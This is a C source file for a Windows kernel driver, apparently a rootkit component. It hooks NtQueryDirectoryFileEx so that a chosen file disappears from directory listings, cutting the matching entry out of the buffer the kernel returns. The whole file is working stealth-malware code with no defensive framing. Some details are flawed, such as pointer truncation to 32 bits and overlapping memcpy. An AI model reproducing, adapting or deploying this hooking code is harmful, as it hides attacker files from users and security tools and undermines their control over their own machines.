#include <ntifs.h>

#include "querydir.h"
#include "handler.h"
#include "stdint.h"

UNICODE_STRING hiddenFile;

static void getFileName(PUNICODE_STRING filename, PVOID fileInfo, FILE_INFORMATION_CLASS fileInfoClass) {
	switch (fileInfoClass) {
		case FileDirectoryInformation:
			filename->Buffer = ((PFILE_DIRECTORY_INFORMATION)fileInfo)->FileName;
			filename->Length = ((PFILE_DIRECTORY_INFORMATION)fileInfo)->FileNameLength;
			break;
		case FileFullDirectoryInformation:
			filename->Buffer = ((PFILE_FULL_DIR_INFORMATION)fileInfo)->FileName;
			filename->Length = ((PFILE_FULL_DIR_INFORMATION)fileInfo)->FileNameLength;
			break;
		case FileBothDirectoryInformation:
			filename->Buffer = ((PFILE_BOTH_DIR_INFORMATION)fileInfo)->FileName;
			filename->Length = ((PFILE_BOTH_DIR_INFORMATION)fileInfo)->FileNameLength;
			break;
		case FileNamesInformation:
			filename->Buffer = ((PFILE_NAMES_INFORMATION)fileInfo)->FileName;
			filename->Length = ((PFILE_NAMES_INFORMATION)fileInfo)->FileNameLength;
			break;
		case FileIdBothDirectoryInformation:
			filename->Buffer = ((PFILE_ID_BOTH_DIR_INFORMATION)fileInfo)->FileName;
			filename->Length = ((PFILE_ID_BOTH_DIR_INFORMATION)fileInfo)->FileNameLength;
			break;
		case FileIdFullDirectoryInformation:
			filename->Buffer = ((PFILE_ID_FULL_DIR_INFORMATION)fileInfo)->FileName;
			filename->Length = ((PFILE_ID_FULL_DIR_INFORMATION)fileInfo)->FileNameLength;
			break;
		case FileIdGlobalTxDirectoryInformation:
			filename->Buffer = ((PFILE_ID_GLOBAL_TX_DIR_INFORMATION)fileInfo)->FileName;
			filename->Length = ((PFILE_ID_GLOBAL_TX_DIR_INFORMATION)fileInfo)->FileNameLength;
			break;
		case FileIdExtdDirectoryInformation:
			filename->Buffer = ((PFILE_ID_EXTD_DIR_INFORMATION)fileInfo)->FileName;
			filename->Length = ((PFILE_ID_EXTD_DIR_INFORMATION)fileInfo)->FileNameLength;
			break;
		case FileIdExtdBothDirectoryInformation:
			filename->Buffer = ((PFILE_ID_EXTD_BOTH_DIR_INFORMATION)fileInfo)->FileName;
			filename->Length = ((PFILE_ID_EXTD_BOTH_DIR_INFORMATION)fileInfo)->FileNameLength;
			break;
		default:
			filename->Buffer = NULL;
			filename->Length = 0;
			break;
	}

	filename->MaximumLength = filename->Length;
}

static ULONG getNextOff(PVOID fileInfo, FILE_INFORMATION_CLASS fileInfoClass) {
	switch (fileInfoClass) {
		case FileDirectoryInformation:
			return ((PFILE_DIRECTORY_INFORMATION)fileInfo)->NextEntryOffset;
		case FileFullDirectoryInformation:
			return ((PFILE_FULL_DIR_INFORMATION)fileInfo)->NextEntryOffset;
		case FileBothDirectoryInformation:
			return ((PFILE_BOTH_DIR_INFORMATION)fileInfo)->NextEntryOffset;
		case FileNamesInformation:
			return ((PFILE_NAMES_INFORMATION)fileInfo)->NextEntryOffset;
		case FileIdBothDirectoryInformation:
			return ((PFILE_ID_BOTH_DIR_INFORMATION)fileInfo)->NextEntryOffset;
		case FileIdFullDirectoryInformation:
			return ((PFILE_ID_FULL_DIR_INFORMATION)fileInfo)->NextEntryOffset;
		case FileIdGlobalTxDirectoryInformation:
			return ((PFILE_ID_GLOBAL_TX_DIR_INFORMATION)fileInfo)->NextEntryOffset;
		case FileIdExtdDirectoryInformation:
			return ((PFILE_ID_EXTD_DIR_INFORMATION)fileInfo)->NextEntryOffset;
		case FileIdExtdBothDirectoryInformation:
			return ((PFILE_ID_EXTD_BOTH_DIR_INFORMATION)fileInfo)->NextEntryOffset;
		default:
			return 0;
	}
}
static void clearNextOff(PVOID fileInfo, FILE_INFORMATION_CLASS fileInfoClass) {
	switch (fileInfoClass) {
		case FileDirectoryInformation:
			((PFILE_DIRECTORY_INFORMATION)fileInfo)->NextEntryOffset = 0;
			break;
		case FileFullDirectoryInformation:
			((PFILE_FULL_DIR_INFORMATION)fileInfo)->NextEntryOffset = 0;
			break;
		case FileBothDirectoryInformation:
			((PFILE_BOTH_DIR_INFORMATION)fileInfo)->NextEntryOffset = 0;
			break;
		case FileNamesInformation:
			((PFILE_NAMES_INFORMATION)fileInfo)->NextEntryOffset = 0;
			break;
		case FileIdBothDirectoryInformation:
			((PFILE_ID_BOTH_DIR_INFORMATION)fileInfo)->NextEntryOffset = 0;
			break;
		case FileIdFullDirectoryInformation:
			((PFILE_ID_FULL_DIR_INFORMATION)fileInfo)->NextEntryOffset = 0;
			break;
		case FileIdGlobalTxDirectoryInformation:
			((PFILE_ID_GLOBAL_TX_DIR_INFORMATION)fileInfo)->NextEntryOffset = 0;
			break;
		case FileIdExtdDirectoryInformation:
			((PFILE_ID_EXTD_DIR_INFORMATION)fileInfo)->NextEntryOffset = 0;
			break;
		case FileIdExtdBothDirectoryInformation:
			((PFILE_ID_EXTD_BOTH_DIR_INFORMATION)fileInfo)->NextEntryOffset = 0;
			break;
		default:
			break;
	}
}

NTSTATUS NTAPI hookNtQueryDirectoryFileEx(
	HANDLE FileHandle,
	HANDLE Event,
	PIO_APC_ROUTINE ApcRoutine,
	PVOID ApcContext,
	PIO_STATUS_BLOCK IoStatusBlock,
	PVOID FileInformation,
	ULONG Length,
	FILE_INFORMATION_CLASS FileInformationClass,
	ULONG QueryFlags,  // Valid flags are in SL_QUERY_DIRECTORY_MASK
	PUNICODE_STRING FileName
) {
	NTSTATUS status;
	UNICODE_STRING us;
	ULONG nextOff;
	PVOID prev, curr;

	status = origNtQueryDirectoryFileEx(FileHandle, Event, ApcRoutine, ApcContext, IoStatusBlock, FileInformation, Length, FileInformationClass, QueryFlags, FileName);

	if (NT_SUCCESS(status) && (
		FileInformationClass == FileDirectoryInformation ||
		FileInformationClass == FileFullDirectoryInformation ||
		FileInformationClass == FileBothDirectoryInformation ||
		FileInformationClass == FileNamesInformation ||
		FileInformationClass == FileIdBothDirectoryInformation ||
		FileInformationClass == FileIdFullDirectoryInformation ||
		FileInformationClass == FileIdGlobalTxDirectoryInformation ||
		FileInformationClass == FileIdExtdDirectoryInformation ||
		FileInformationClass == FileIdExtdBothDirectoryInformation)) {

		//memcpy(us.Buffer, L"lolol.txt", us.Length);

		if (QueryFlags & SL_RETURN_SINGLE_ENTRY) {
			getFileName(&us, FileInformation, FileInformationClass);
			if (!RtlCompareUnicodeString(&us, &hiddenFile, TRUE)) {
				status = origNtQueryDirectoryFileEx(FileHandle, Event, ApcRoutine, ApcContext, IoStatusBlock, FileInformation, Length, FileInformationClass, QueryFlags, FileName);
			}
		} else {
			curr = FileInformation;
			prev = NULL;
			do {
				nextOff = getNextOff(curr, FileInformationClass);
				getFileName(&us, curr, FileInformationClass);
				if (!RtlCompareUnicodeString(&us, &hiddenFile, TRUE)) {
					if (nextOff) {
						//copy rest of the buffer over our entry
						//    where?             what?                                    how much?
						//     here              next                     current length - before our entry - our entry
						memcpy(curr, ((uint8_t*)curr) + nextOff, Length - (((uint32_t)curr) - ((uint32_t)FileInformation)) - nextOff);
					} else {
						if (prev) {
							clearNextOff(prev, FileInformationClass);
						} else {
							status = STATUS_NO_MORE_FILES;
						}
					}
					break;
				}

				prev = curr;
				curr = ((uint8_t*)curr) + nextOff;
			} while (nextOff);
		}
	}

	
	return status;
}